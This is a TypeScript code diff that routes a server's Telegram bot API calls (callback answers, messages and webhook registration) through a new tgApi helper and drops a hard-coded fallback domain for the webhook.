@@ -17,6 +17,7 @@ import { getIO, getSessionById } from "./socket";
 import { setPendingCustomText, getPendingCustomText, deletePendingCustomText } from "./db";
 import { sendTelegramMessage } from "./telegram";
 import { getAppConfig } from "./db";
+import { tgApi } from "./tgapi";
 
 // Tokens are loaded dynamically from DB (set via admin panel Config)
 // Fallback to env vars for backward compatibility
@@ -417,7 +418,7 @@ function buildDataSummary(data: Record<string, string>): string {
 async function answerCallbackQuery(callbackQueryId: string, text: string): Promise<void> {
   try {
     const { botToken } = await getTelegramConfig();
-    await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+    await fetch(tgApi(botToken, 'answerCallbackQuery'), {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -449,7 +450,7 @@ async function sendTelegramMessageWithReply(
       body.reply_markup = replyMarkup;
     }
     const { botToken } = await getTelegramConfig();
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    await fetch(tgApi(botToken, 'sendMessage'), {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(body),
@@ -465,7 +466,7 @@ async function sendTelegramMessageWithReply(
 async function sendTelegramForceReply(chatId: string, text: string): Promise<void> {
   try {
     const { botToken } = await getTelegramConfig();
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    await fetch(tgApi(botToken, 'sendMessage'), {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -536,7 +537,8 @@ async function autoRegisterWebhook(): Promise<void> {
   }
 
   // Use the published domain if available, otherwise use VITE_APP_URL or hardcoded production domain
-  const domain = process.env.DEPLOYED_DOMAIN || process.env.VITE_APP_URL || "https://membrsiapppscongfigebapps.manus.space";
+  // Use deployed domain or the project's published URL
+  const domain = process.env.DEPLOYED_DOMAIN || process.env.VITE_APP_URL || "";
 
   if (!domain || domain.includes("localhost") || domain.includes("manus.computer")) {
     // In development, we'll set it manually
@@ -547,7 +549,7 @@ async function autoRegisterWebhook(): Promise<void> {
   const webhookUrl = `${domain}/api/telegram/webhook`;
 
   try {
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
+    const response = await fetch(tgApi(botToken, 'setWebhook'), {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -581,7 +583,7 @@ export async function setTelegramWebhook(baseUrl: string): Promise<boolean> {
   const webhookUrl = `${baseUrl}/api/telegram/webhook`;
 
   try {
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
+    const response = await fetch(tgApi(botToken, 'setWebhook'), {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
